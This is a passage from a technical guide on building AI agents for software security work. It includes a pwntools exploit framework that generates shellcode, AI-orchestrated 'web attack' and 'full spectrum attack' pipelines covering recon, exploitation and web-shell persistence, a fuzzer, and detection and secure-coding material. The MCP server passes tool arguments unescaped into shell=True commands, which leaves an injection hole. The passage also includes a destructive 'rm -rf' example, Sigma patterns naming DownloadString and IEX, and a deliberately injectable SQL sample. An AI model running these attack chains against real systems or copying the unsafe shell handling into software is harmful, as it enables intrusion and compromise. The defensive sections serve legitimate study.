        max_iterations = self.rate_limits['fuzzing_iterations']
        if iterations > max_iterations:
            self._log_violation('fuzzing_limit', str(iterations))
            return False, f"Iterations {iterations} exceeds limit {max_iterations}"
        
        return True, "Fuzzing parameters validated"
    
    def _log_violation(self, violation_type: str, details: str):
        """Log a violation"""
        self.audit_log.append({
            'type': violation_type,
            'details': details,
            'timestamp': datetime.now().isoformat()
        })
        self.logger.warning(f"Safety violation: {violation_type} - {details}")
    
    def get_audit_log(self) -> list:
        """Get audit log"""
        return self.audit_log

# Example usage
guardrails = SoftwareSafetyGuardrails()

# Validate command
valid, message = guardrails.validate_command("rm -rf /tmp/test")
print(f"Command valid: {valid} - {message}")

# Validate target
valid, message = guardrails.validate_target("192.168.1.1")
print(f"Target valid: {valid} - {message}")

# Validate exploit
valid, message = guardrails.validate_exploit("payload = b'A' * 64")
print(f"Exploit valid: {valid} - {message}")
```

---

### 2.3.10 Deployment Patterns for Software Agents

**Docker Compose:**

```yaml
# docker-compose.yml for Software Security Agents
version: '3.8'

services:
  # Core agent runtime
  hermes-software-agent:
    build: ./agent
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
      - REDIS_HOST=redis
      - QDRANT_HOST=qdrant
      - NEO4J_HOST=neo4j
    volumes:
      - ./config:/app/config
      - ./data:/app/data
      - ./binaries:/app/binaries
    depends_on:
      - redis
      - qdrant
      - neo4j
    networks:
      - software-net

  # Binary Analysis Agent
  binary-agent:
    build: ./agents/binary
    volumes:
      - ./binaries:/app/binaries
      - ./ghidra-projects:/app/ghidra-projects
    environment:
      - AGENT_NAME=binary-analyst
      - GHIDRA_PATH=/opt/ghidra
    networks:
      - software-net

  # Web Analysis Agent
  web-agent:
    build: ./agents/web
    environment:
      - AGENT_NAME=web-analyst
      - BURP_URL=http://burp:1337
    depends_on:
      - burp
    networks:
      - software-net

  # Fuzzing Agent
  fuzz-agent:
    build: ./agents/fuzz
    volumes:
      - ./fuzzing:/app/fuzzing
    environment:
      - AGENT_NAME=fuzzer
    networks:
      - software-net

  # Malware Analysis Agent
  malware-agent:
    build: ./agents/malware
    volumes:
      - ./samples:/app/samples
    environment:
      - AGENT_NAME=malware-analyst
    networks:
      - software-net

  # Exploit Development Agent
  exploit-agent:
    build: ./agents/exploit
    volumes:
      - ./exploits:/app/exploits
    environment:
      - AGENT_NAME=exploit-dev
    networks:
      - software-net

  # Infrastructure
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    networks:
      - software-net

  qdrant:
    image: qdrant/qdrant:latest
    ports:
      - "6333:6333"
    networks:
      - software-net

  neo4j:
    image: neo4j:5
    ports:
      - "7474:7474"
      - "7687:7687"
    environment:
      - NEO4J_AUTH=neo4j/password
    networks:
      - software-net

  burp:
    image: portswigger/burp:latest
    ports:
      - "1337:1337"
      - "8080:8080"
    networks:
      - software-net

networks:
  software-net:
    driver: bridge
```

---

# PART THREE: CUSTOM SOFTWARE DEVELOPMENT — EXPANDED 2X

## Writing Custom Tools, Exploits, and Frameworks

---

## SECTION 3.1: WRITING CUSTOM EXPLOITS

### 3.1.1 Exploit Development Framework

```python
#!/usr/bin/env python3
"""
Custom Exploit Development Framework
"""

from pwn import *
import struct

class ExploitFramework:
    def __init__(self, binary_path: str, libc_path: str = None):
        self.binary_path = binary_path
        self.elf = ELF(binary_path)
        self.libc = ELF(libc_path) if libc_path else None
        self.rop = ROP(self.elf)
        self.context = {
            'arch': self.elf.arch,
            'os': 'linux',
            'endian': self.elf.endian,
        }
    
    def check_mitigations(self) -> dict:
        """Check binary mitigations"""
        return {
            'arch': self.elf.arch,
            'bits': self.elf.bits,
            'endian': self.elf.endian,
            'relro': self.elf.relro,
            'canary': self.elf.canary,
            'nx': self.elf.nx,
            'pie': self.elf.pie,
            'rpath': self.elf.rpath,
            'runpath': self.elf.runpath,
        }
    
    def find_gadgets(self, pattern: str = None) -> list:
        """Find ROP gadgets"""
        if pattern:
            return self.rop.find_gadget(pattern.split('; '))
        return self.rop.gadgets
    
    def build_rop_chain(self, calls: list) -> bytes:
        """Build a ROP chain"""
        chain = b''
        for call in calls:
            func = call['function']
            args = call.get('args', [])
            chain += self.rop.call(func, args)
        return chain
    
    def build_format_string(self, writes: list) -> bytes:
        """Build a format string payload"""
        payload = b''
        # Implementation depends on specific format string
        return payload
    
    def generate_shellcode(self, payload: str = 'execve') -> bytes:
        """Generate shellcode"""
        if self.context['arch'] == 'amd64':
            return asm(shellcraft.amd64.sh())
        elif self.context['arch'] == 'i386':
            return asm(shellcraft.i386.sh())
        elif self.context['arch'] == 'arm':
            return asm(shellcraft.arm.sh())
        else:
            raise ValueError(f"Unsupported architecture: {self.context['arch']}")
    
    def create_exploit_template(self) -> str:
        """Create an exploit template"""
        mitigations = self.check_mitigations()
        
        template = f'''#!/usr/bin/env python3
"""
Exploit for {self.binary_path}
Generated by ExploitFramework
"""

from pwn import *

# Configuration
context.arch = '{mitigations["arch"]}'
context.os = 'linux'
context.log_level = 'info'

# Binary
elf = ELF('{self.binary_path}')
{'libc = ELF("' + self.libc.path + '")' if self.libc else ''}

# Mitigations
# RELRO: {mitigations["relro"]}
# Canary: {mitigations["canary"]}
# NX: {mitigations["nx"]}
# PIE: {mitigations["pie"]}

def exploit():
    """Main exploit function"""
    # Start process
    if args.REMOTE:
        p = remote('target', 1337)
    elif args.GDB:
        p = gdb.debug('{self.binary_path}', gdbscript='continue')
    else:
        p = process('{self.binary_path}')
    
    # Your exploit here
    
    p.interactive()

if __name__ == "__main__":
    exploit()
'''
        return template

# Example usage
if __name__ == "__main__":
    framework = ExploitFramework('./vulnerable_binary')
    
    print("Mitigations:")
    for k, v in framework.check_mitigations().items():
        print(f"  {k}: {v}")
    
    print("\nGadgets:")
    for addr, gadget in list(framework.find_gadgets().items())[:10]:
        print(f"  0x{addr:x}: {gadget}")
    
    print("\nExploit Template:")
    print(framework.create_exploit_template())
```

---

## SECTION 3.2: WRITING CUSTOM TOOLS

### 3.2.1 Custom Parser Fuzzer

```python
#!/usr/bin/env python3
"""
Custom Parser Fuzzer
Grammar-based fuzzer for binary protocols
"""

import random
import struct
from typing import List, Dict, Any

class ParserFuzzer:
    def __init__(self, seed: int = 42):
        random.seed(seed)
        self.corpus = []
        self.crashes = []
    
    def generate_field(self, field_type: str, constraints: Dict = None) -> bytes:
        """Generate a field of the specified type"""
        constraints = constraints or {}
        
        if field_type == 'u8':
            return struct.pack('<B', random.randint(0, 255))
        elif field_type == 'u16':
            return struct.pack('<H', random.randint(0, 65535))
        elif field_type == 'u32':
            return struct.pack('<I', random.randint(0, 2**32 - 1))
        elif field_type == 'u64':
            return struct.pack('<Q', random.randint(0, 2**64 - 1))
        elif field_type == 'i8':
            return struct.pack('<b', random.randint(-128, 127))
        elif field_type == 'i16':
            return struct.pack('<h', random.randint(-32768, 32767))
        elif field_type == 'i32':
            return struct.pack('<i', random.randint(-2**31, 2**31 - 1))
        elif field_type == 'string':
            length = constraints.get('length', random.randint(1, 100))
            return bytes(random.randint(32, 126) for _ in range(length))
        elif field_type == 'bytes':
            length = constraints.get('length', random.randint(1, 100))
            return bytes(random.randint(0, 255) for _ in range(length))
        elif field_type == 'magic':
            return constraints.get('value', b'\\x00' * 4)
        else:
            raise ValueError(f"Unknown field type: {field_type}")
    
    def generate_message(self, schema: List[Dict]) -> bytes:
        """Generate a message based on schema"""
        message = b''
        for field in schema:
            field_type = field['type']
            constraints = field.get('constraints', {})
            
            # Handle special cases
            if field_type == 'length':
                # Length field - will be filled later
                message += b'\\x00' * field.get('size', 4)
            elif field_type == 'checksum':
                # Checksum field - will be filled later
                message += b'\\x00' * field.get('size', 4)
            else:
                message += self.generate_field(field_type, constraints)
        
        return message
    
    def mutate(self, data: bytes, num_mutations: int = 1) -> bytes:
        """Mutate existing data"""
        data = bytearray(data)
        
        for _ in range(num_mutations):
            mutation_type = random.choice([
                'bit_flip', 'byte_flip', 'byte_insert', 'byte_delete',
                'byte_swap', 'chunk_duplicate', 'chunk_delete',
                'integer_overflow', 'format_string'
            ])
            
            if mutation_type == 'bit_flip' and len(data) > 0:
                pos = random.randint(0, len(data) - 1)
                bit = random.randint(0, 7)
                data[pos] ^= (1 << bit)
            
            elif mutation_type == 'byte_flip' and len(data) > 0:
                pos = random.randint(0, len(data) - 1)
                data[pos] = random.randint(0, 255)
            
            elif mutation_type == 'byte_insert':
                pos = random.randint(0, len(data))
                data.insert(pos, random.randint(0, 255))
            
            elif mutation_type == 'byte_delete' and len(data) > 0:
                pos = random.randint(0, len(data) - 1)
                del data[pos]
            
            elif mutation_type == 'byte_swap' and len(data) > 1:
                pos1 = random.randint(0, len(data) - 1)
                pos2 = random.randint(0, len(data) - 1)
                data[pos1], data[pos2] = data[pos2], data[pos1]
            
            elif mutation_type == 'chunk_duplicate' and len(data) > 0:
                start = random.randint(0, len(data) - 1)
                end = random.randint(start, min(start + 100, len(data)))
                chunk = data[start:end]
                pos = random.randint(0, len(data))
                data[pos:pos] = chunk
            
            elif mutation_type == 'chunk_delete' and len(data) > 0:
                start = random.randint(0, len(data) - 1)
                end = random.randint(start, min(start + 100, len(data)))
                del data[start:end]
            
            elif mutation_type == 'integer_overflow':
                # Find 4-byte integers and set to max/min
                if len(data) >= 4:
                    pos = random.randint(0, len(data) - 4)
                    value = random.choice([0, 0xFFFFFFFF, 0x7FFFFFFF, 0x80000000])
                    data[pos:pos+4] = struct.pack('<I', value)
            
            elif mutation_type == 'format_string':
                # Insert format string specifiers
                if len(data) > 0:
                    pos = random.randint(0, len(data) - 1)
                    fmt = random.choice([b'%s', b'%n', b'%x', b'%p', b'%99999999s'])
                    data[pos:pos] = fmt
        
        return bytes(data)
    
    def fuzz(self, target_func, schema: List[Dict], iterations: int = 10000):
        """Run fuzzing campaign"""
        for i in range(iterations):
            # Generate or mutate
            if random.random() < 0.5 or not self.corpus:
                message = self.generate_message(schema)
            else:
                seed = random.choice(self.corpus)
                message = self.mutate(seed, random.randint(1, 5))
            
            # Test
            try:
                result = target_func(message)
                
                # Check for crash
                if result is None or result != 0:
                    self.crashes.append({
                        'iteration': i,
                        'message': message,
                        'result': result
                    })
                    print(f"[!] Crash at iteration {i}: {message.hex()}")
                else:
                    # Add to corpus
                    self.corpus.append(message)
                    
                    # Limit corpus size
                    if len(self.corpus) > 1000:
                        self.corpus = self.corpus[-1000:]
            
            except Exception as e:
                self.crashes.append({
                    'iteration': i,
                    'message': message,
                    'exception': str(e)
                })
                print(f"[!] Exception at iteration {i}: {e}")
            
            if i % 1000 == 0:
                print(f"[*] Iteration {i}, corpus size: {len(self.corpus)}, crashes: {len(self.crashes)}")
        
        return self.crashes

# Example usage
if __name__ == "__main__":
    # Define schema
    schema = [
        {'type': 'magic', 'constraints': {'value': b'FUZZ'}},
        {'type': 'u8', 'name': 'version'},
        {'type': 'u16', 'name': 'command'},
        {'type': 'length', 'size': 4},
        {'type': 'bytes', 'constraints': {'length': 64}},
        {'type': 'checksum', 'size': 4},
    ]
    
    # Define target
    def target(message: bytes) -> int:
        """Target function to fuzz"""
        # Parse message
        if len(message) < 4:
            return -1
        if message[:4] != b'FUZZ':
            return -1
        if len(message) < 16:
            return -1
        # ... parse rest
        return 0
    
    # Run fuzzer
    fuzzer = ParserFuzzer()
    crashes = fuzzer.fuzz(target, schema, iterations=10000)
    
    print(f"\nTotal crashes: {len(crashes)}")
```

---

### 3.2.2 Custom MCP Server for Software Tools

```python
#!/usr/bin/env python3
"""
Custom MCP Server for Software Security Tools
"""

import asyncio
import json
import subprocess
from mcp.server import Server, stdio_server
from mcp.types import Tool, TextContent

server = Server("software-security-mcp")

@server.list_tools()
async def list_tools():
    return [
        Tool(name="checksec", description="Check binary mitigations"),
        Tool(name="strings", description="Extract strings from binary"),
        Tool(name="objdump", description="Disassemble binary"),
        Tool(name="readelf", description="Read ELF headers"),
        Tool(name="nm", description="List symbols"),
        Tool(name="ldd", description="List dynamic dependencies"),
        Tool(name="strace", description="Trace system calls"),
        Tool(name="ltrace", description="Trace library calls"),
        Tool(name="gdb", description="Run GDB commands"),
        Tool(name="radare2", description="Run radare2 commands"),
        Tool(name="yara", description="Scan with YARA rules"),
        Tool(name="binwalk", description="Analyze firmware"),
    ]

@server.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    if name == "checksec":
        result = await checksec(arguments["binary"])
    elif name == "strings":
        result = await strings(arguments["binary"], arguments.get("min_len", 6))
    elif name == "objdump":
        result = await objdump(arguments["binary"])
    elif name == "readelf":
        result = await readelf(arguments["binary"])
    elif name == "nm":
        result = await nm(arguments["binary"])
    elif name == "ldd":
        result = await ldd(arguments["binary"])
    elif name == "strace":
        result = await strace(arguments["binary"], arguments.get("args", []))
    elif name == "ltrace":
        result = await ltrace(arguments["binary"], arguments.get("args", []))
    elif name == "gdb":
        result = await gdb(arguments["binary"], arguments["commands"])
    elif name == "radare2":
        result = await radare2(arguments["binary"], arguments["commands"])
    elif name == "yara":
        result = await yara(arguments["file"], arguments["rules"])
    elif name == "binwalk":
        result = await binwalk(arguments["firmware"])
    else:
        result = f"Unknown tool: {name}"
    
    return [TextContent(type="text", text=result)]

async def checksec(binary):
    """Check binary mitigations"""
    cmd = f"checksec --file={binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def strings(binary, min_len=6):
    """Extract strings"""
    cmd = f"strings -n {min_len} {binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def objdump(binary):
    """Disassemble binary"""
    cmd = f"objdump -d {binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def readelf(binary):
    """Read ELF headers"""
    cmd = f"readelf -a {binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def nm(binary):
    """List symbols"""
    cmd = f"nm {binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def ldd(binary):
    """List dependencies"""
    cmd = f"ldd {binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def strace(binary, args):
    """Trace system calls"""
    args_str = ' '.join(args)
    cmd = f"strace {binary} {args_str}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stderr

async def ltrace(binary, args):
    """Trace library calls"""
    args_str = ' '.join(args)
    cmd = f"ltrace {binary} {args_str}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stderr

async def gdb(binary, commands):
    """Run GDB commands"""
    gdb_commands = '\n'.join(commands)
    cmd = f"gdb -batch -ex '{gdb_commands}' {binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def radare2(binary, commands):
    """Run radare2 commands"""
    commands_str = ';'.join(commands)
    cmd = f"r2 -q -c '{commands_str}' {binary}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def yara(file, rules):
    """Scan with YARA"""
    cmd = f"yara {rules} {file}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def binwalk(firmware):
    """Analyze firmware"""
    cmd = f"binwalk {firmware}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream)

if __name__ == "__main__":
    asyncio.run(main())
```

---

# PART FOUR: COMBINED SOFTWARE OPERATIONS — EXPANDED 2X

## Multi-Tool Attack Chains and Integrated Workflows

---

## SECTION 4.1: FULL ATTACK CHAIN WORKFLOWS

### 4.1.1 Web Application Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      WEB APPLICATION ATTACK CHAIN                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Phase 1: Reconnaissance                                                    │
│  ├── Subdomain enumeration (Amass, Subfinder)                              │
│  ├── Port scanning (nmap, masscan)                                         │
│  ├── Technology fingerprinting (Wappalyzer, WhatWeb)                       │
│  ├── Directory discovery (ffuf, gobuster)                                  │
│  └── Parameter discovery (Arjun, ParamSpider)                              │
│                                                                              │
│  Phase 2: Vulnerability Discovery                                           │
│  ├── Automated scanning (Nuclei, Burp, ZAP)                                │
│  ├── Manual testing (Burp Repeater, Intruder)                              │
│  ├── SQL injection (sqlmap)                                                │
│  ├── XSS (XSStrike, manual)                                                │
│  ├── SSRF (Collaborator, manual)                                           │
│  ├── XXE (manual)                                                          │
│  ├── Deserialization (ysoserial, manual)                                   │
│  └── Business logic flaws (manual)                                         │
│                                                                              │
│  Phase 3: Exploitation                                                      │
│  ├── SQLi → Data extraction → RCE                                          │
│  ├── XSS → Session hijacking → Account takeover                            │
│  ├── SSRF → Internal service access → Cloud metadata                       │
│  ├── XXE → File read → SSRF → RCE                                          │
│  ├── Deserialization → RCE                                                 │
│  └── File upload → Web shell → RCE                                         │
│                                                                              │
│  Phase 4: Post-Exploitation                                                 │
│  ├── Privilege escalation                                                  │
│  ├── Lateral movement                                                      │
│  ├── Persistence                                                           │
│  ├── Data exfiltration                                                     │
│  └── Covering tracks                                                       │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**AI-Orchestrated Web Attack:**

```python
#!/usr/bin/env python3
"""
AI-Orchestrated Web Application Attack
"""

import asyncio
from mcp.client import MCPClient

class WebAttackOrchestrator:
    def __init__(self):
        self.mcp = MCPClient()
        self.mcp.register_server("nuclei", "nuclei-mcp")
        self.mcp.register_server("sqlmap", "sqlmap-mcp")
        self.mcp.register_server("burp", "burp-mcp")
        self.mcp.register_server("ffuf", "ffuf-mcp")
    
    async def run_full_attack(self, target: str) -> dict:
        """Run full web attack chain"""
        
        results = {
            "target": target,
            "recon": {},
            "vulnerabilities": [],
            "exploits": [],
            "post_exploitation": {}
        }
        
        # Phase 1: Reconnaissance
        print("[*] Phase 1: Reconnaissance")
        results["recon"]["subdomains"] = await self._enumerate_subdomains(target)
        results["recon"]["ports"] = await self._scan_ports(target)
        results["recon"]["directories"] = await self._discover_directories(target)
        results["recon"]["parameters"] = await self._discover_parameters(target)
        
        # Phase 2: Vulnerability Discovery
        print("[*] Phase 2: Vulnerability Discovery")
        results["vulnerabilities"] = await self._scan_vulnerabilities(target)
        
        # Phase 3: Exploitation
        print("[*] Phase 3: Exploitation")
        for vuln in results["vulnerabilities"]:
            if vuln["severity"] in ["critical", "high"]:
                exploit = await self._exploit(vuln)
                if exploit:
                    results["exploits"].append(exploit)
        
        # Phase 4: Post-Exploitation
        print("[*] Phase 4: Post-Exploitation")
        if results["exploits"]:
            results["post_exploitation"] = await self._post_exploit(results["exploits"][0])
        
        return results
    
    async def _enumerate_subdomains(self, target: str) -> list:
        """Enumerate subdomains"""
        result = await self.mcp.call("nuclei", "subdomain_enum", {
            "domain": target
        })
        return result.get("subdomains", [])
    
    async def _scan_ports(self, target: str) -> list:
        """Scan ports"""
        result = await self.mcp.call("nuclei", "port_scan", {
            "target": target
        })
        return result.get("ports", [])
    
    async def _discover_directories(self, target: str) -> list:
        """Discover directories"""
        result = await self.mcp.call("ffuf", "directory_scan", {
            "url": f"https://{target}/FUZZ"
        })
        return result.get("directories", [])
    
    async def _discover_parameters(self, target: str) -> list:
        """Discover parameters"""
        result = await self.mcp.call("ffuf", "parameter_scan", {
            "url": f"https://{target}/?"
        })
        return result.get("parameters", [])
    
    async def _scan_vulnerabilities(self, target: str) -> list:
        """Scan for vulnerabilities"""
        result = await self.mcp.call("nuclei", "scan", {
            "target": f"https://{target}"
        })
        return result.get("vulnerabilities", [])
    
    async def _exploit(self, vulnerability: dict) -> dict:
        """Exploit a vulnerability"""
        vuln_type = vulnerability.get("type")
        
        if vuln_type == "sqli":
            return await self._exploit_sqli(vulnerability)
        elif vuln_type == "xss":
            return await self._exploit_xss(vulnerability)
        elif vuln_type == "rce":
            return await self._exploit_rce(vulnerability)
        else:
            return None
    
    async def _exploit_sqli(self, vulnerability: dict) -> dict:
        """Exploit SQL injection"""
        result = await self.mcp.call("sqlmap", "exploit", {
            "url": vulnerability["url"],
            "param": vulnerability["param"]
        })
        return result
    
    async def _exploit_xss(self, vulnerability: dict) -> dict:
        """Exploit XSS"""
        return {
            "type": "xss",
            "url": vulnerability["url"],
            "payload": vulnerability["payload"]
        }
    
    async def _exploit_rce(self, vulnerability: dict) -> dict:
        """Exploit RCE"""
        return {
            "type": "rce",
            "url": vulnerability["url"],
            "command": "id"
        }
    
    async def _post_exploit(self, exploit: dict) -> dict:
        """Post-exploitation"""
        return {
            "access": "shell",
            "privileges": "www-data",
            "persistence": "web shell"
        }

if __name__ == "__main__":
    orchestrator = WebAttackOrchestrator()
    results = asyncio.run(orchestrator.run_full_attack("example.com"))
    print(json.dumps(results, indent=2))
```

---

## SECTION 4.2: COMBINED BINARY + WEB + CLOUD

### 4.2.1 Full Spectrum Attack

```python
#!/usr/bin/env python3
"""
Full Spectrum Attack Orchestrator
Combines binary, web, and cloud attack techniques
"""

import asyncio
from mcp.client import MCPClient

class FullSpectrumOrchestrator:
    def __init__(self):
        self.mcp = MCPClient()
        
        # Register all MCP servers
        self.mcp.register_server("ghidra", "ghidra-mcp")
        self.mcp.register_server("gdb", "gdb-mcp")
        self.mcp.register_server("pwntools", "pwntools-mcp")
        self.mcp.register_server("burp", "burp-mcp")
        self.mcp.register_server("sqlmap", "sqlmap-mcp")
        self.mcp.register_server("aws", "aws-mcp")
        self.mcp.register_server("azure", "azure-mcp")
        self.mcp.register_server("gcp", "gcp-mcp")
    
    async def run(self, target: dict) -> dict:
        """Run full spectrum attack"""
        
        results = {
            "target": target,
            "binary": {},
            "web": {},
            "cloud": {},
            "combined": {}
        }
        
        # Binary analysis
        if target.get("binary"):
            print("[*] Binary Analysis")
            results["binary"] = await self._binary_attack(target["binary"])
        
        # Web analysis
        if target.get("web"):
            print("[*] Web Analysis")
            results["web"] = await self._web_attack(target["web"])
        
        # Cloud analysis
        if target.get("cloud"):
            print("[*] Cloud Analysis")
            results["cloud"] = await self._cloud_attack(target["cloud"])
        
        # Combined attack
        if all([target.get("binary"), target.get("web"), target.get("cloud")]):
            print("[*] Combined Attack")
            results["combined"] = await self._combined_attack(results)
        
        return results
    
    async def _binary_attack(self, binary: str) -> dict:
        """Perform binary attack"""
        # Analyze binary
        analysis = await self.mcp.call("ghidra", "ghidra_open", {
            "binary_path": binary
        })
        
        # Find vulnerabilities
        vulns = await self.mcp.call("ghidra", "ghidra_functions", {})
        
        # Develop exploit
        exploit = await self.mcp.call("pwntools", "build_exploit", {
            "binary": binary,
            "vulnerability": "buffer_overflow"
        })
        
        return {
            "analysis": analysis,
            "vulnerabilities": vulns,
            "exploit": exploit
        }
    
    async def _web_attack(self, url: str) -> dict:
        """Perform web attack"""
        # Scan
        scan = await self.mcp.call("burp", "burp_scan", {
            "url": url
        })
        
        # Test SQLi
        sqli = await self.mcp.call("sqlmap", "sqlmap_scan", {
            "url": url,
            "param": "id"
        })
        
        return {
            "scan": scan,
            "sqli": sqli
        }
    
    async def _cloud_attack(self, provider: str) -> dict:
        """Perform cloud attack"""
        # Enumerate resources
        if provider == "aws":
            resources = await self.mcp.call("aws", "enumerate", {})
        elif provider == "azure":
            resources = await self.mcp.call("azure", "enumerate", {})
        elif provider == "gcp":
            resources = await self.mcp.call("gcp", "enumerate", {})
        else:
            resources = {}
        
        return {
            "provider": provider,
            "resources": resources
        }
    
    async def _combined_attack(self, results: dict) -> dict:
        """Perform combined attack"""
        # Use binary exploit to gain initial access
        # Use web vulnerability to pivot
        # Use cloud misconfiguration to escalate
        
        return {
            "initial_access": results["binary"].get("exploit"),
            "pivot": results["web"].get("sqli"),
            "escalation": results["cloud"].get("resources")
        }
```

---

# PART FIVE: DEFENSIVE SOFTWARE — EXPANDED 2X

## Detection Engineering, Secure Development, and AI-Powered Defense

---

## SECTION 5.1: DETECTION ENGINEERING

### 5.1.1 Sigma Rules

```yaml
# Sigma rule for detecting suspicious process creation
title: Suspicious Process Creation
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detects suspicious process creation patterns
author: Security Team
date: 2026/01/15
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
            - '\wscript.exe'
            - '\cscript.exe'
        CommandLine|contains:
            - 'Invoke-Expression'
            - 'IEX'
            - 'DownloadString'
            - 'FromBase64String'
            - 'EncodedCommand'
    condition: selection
falsepositives:
    - Legitimate administrative scripts
    - Software installation
level: high
tags:
    - attack.execution
    - attack.t1059
```

---

### 5.1.2 Detection with AI

```python
#!/usr/bin/env python3
"""
AI-Powered Detection Engineering
Uses LLM to generate detection rules
"""

from openai import OpenAI

client = OpenAI()

def generate_sigma_rule(attack_description: str) -> str:
    """Generate a Sigma rule from an attack description"""
    
    prompt = f"""
    Generate a Sigma detection rule for the following attack:
    
    {attack_description}
    
    The rule should:
    1. Follow the Sigma specification
    2. Include appropriate logsource
    3. Include detection logic
    4. Include false positive notes
    5. Include MITRE ATT&CK tags
    
    Output only the YAML rule.
    """
    
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a detection engineer."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.2
    )
    
    return response.choices[0].message.content

def generate_yara_rule(malware_description: str) -> str:
    """Generate a YARA rule from a malware description"""
    
    prompt = f"""
    Generate a YARA rule for the following malware:
    
    {malware_description}
    
    The rule should:
    1. Include metadata (author, date, description)
    2. Include strings (unique indicators)
    3. Include condition (logic)
    4. Be specific enough to avoid false positives
    
    Output only the YARA rule.
    """
    
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a malware analyst."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.2
    )
    
    return response.choices[0].message.content

# Example usage
sigma_rule = generate_sigma_rule("""
PowerShell process creating a scheduled task to establish persistence.
The process uses Register-ScheduledTask cmdlet and creates a task
that runs a base64-encoded command.
""")
print(sigma_rule)

yara_rule = generate_yara_rule("""
Ransomware that encrypts files with AES-256 and appends .encrypted extension.
It drops a ransom note named README.txt with a Bitcoin address.
It uses the string "YOUR FILES HAVE BEEN ENCRYPTED" in the note.
""")
print(yara_rule)
```

---

## SECTION 5.2: SECURE DEVELOPMENT

### 5.2.1 Secure Coding Practices

| Practice | Description | Implementation |
|----------|-------------|----------------|
| **Input Validation** | Validate all input | Whitelist, type checking, length limits |
| **Output Encoding** | Encode output | HTML, URL, JavaScript, SQL encoding |
| **Parameterized Queries** | Prevent SQL injection | Prepared statements, ORM |
| **Memory Safety** | Prevent memory corruption | Rust, Go, safe C++ |
| **Authentication** | Strong authentication | MFA, OAuth, OIDC |
| **Authorization** | Proper access control | RBAC, ABAC, least privilege |
| **Session Management** | Secure sessions | Secure cookies, short expiry |
| **Cryptography** | Strong crypto | AES-256, RSA-4096, TLS 1.3 |
| **Error Handling** | Don't leak info | Generic errors, logging |
| **Logging** | Comprehensive logging | Structured logs, no PII |
| **Dependency Management** | Update dependencies | SCA, Dependabot |
| **Secret Management** | Protect secrets | Vault, KMS, env vars |
| **Rate Limiting** | Prevent abuse | Token bucket, sliding window |
| **CORS** | Restrict cross-origin | Whitelist origins |
| **CSP** | Content Security Policy | Restrict scripts |
| **SRI** | Subresource Integrity | Verify CDN resources |

---

### 5.2.2 Secure Code Review with AI

```python
#!/usr/bin/env python3
"""
AI-Powered Secure Code Review
"""

from openai import OpenAI

client = OpenAI()

def review_code(code: str, language: str) -> dict:
    """Review code for security issues"""
    
    prompt = f"""
    Review the following {language} code for security vulnerabilities:
    
    ```{language}
    {code}
    ```
    
    For each vulnerability found, provide:
    1. Vulnerability type (CWE)
    2. Line number
    3. Description
    4. Severity (critical/high/medium/low)
    5. Suggested fix
    
    Also provide:
    - Overall security assessment
    - Recommendations for improvement
    
    Output in JSON format.
    """
    
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a security code reviewer."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.1,
        response_format={"type": "json_object"}
    )
    
    import json
    return json.loads(response.choices[0].message.content)

# Example usage
code = """
import sqlite3

def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

def login(username, password):
    user = get_user(username)
    if user and user['password'] == password:
        return True
    return False
"""

review = review_code(code, "python")
print(json.dumps(review, indent=2))
```

---

# APPENDICES

## Appendix A: Software Security Glossary

| Term | Definition |
|------|------------|
| **ASLR** | Address Space Layout Randomization — randomizes memory layout |
| **ROP** | Return-Oriented Programming — chaining existing code gadgets |
| **JOP** | Jump-Oriented Programming — chaining jump instructions |
| **COP** | Call-Oriented Programming — chaining call instructions |
| **SROP** | Sigreturn-Oriented Programming — using sigreturn syscall |
| **UAF** | Use-After-Free — using memory after it's freed |
| **TOCTOU** | Time-of-Check to Time-of-Use — race condition |
| **SSRF** | Server-Side Request Forgery — server makes attacker-controlled request |
| **XXE** | XML External Entity — XML parsing vulnerability |
| **SQLi** | SQL Injection — injecting SQL commands |
| **XSS** | Cross-Site Scripting — injecting JavaScript |
| **CSRF** | Cross-Site Request Forgery — forcing authenticated requests |
| **IDOR** | Insecure Direct Object Reference — accessing objects without authorization |
| **BOLA** | Broken Object Level Authorization — API authorization flaw |
| **RCE** | Remote Code Execution — executing arbitrary code |
| **LFI** | Local File Inclusion — including local files |
| **RFI** | Remote File Inclusion — including remote files |
| **CWE** | Common Weakness Enumeration — vulnerability classification |
| **CVE** | Common Vulnerabilities and Exposures — vulnerability identifier |
| **CVSS** | Common Vulnerability Scoring System — severity score |
| **EPSS** | Exploit Prediction Scoring System — exploitation likelihood |
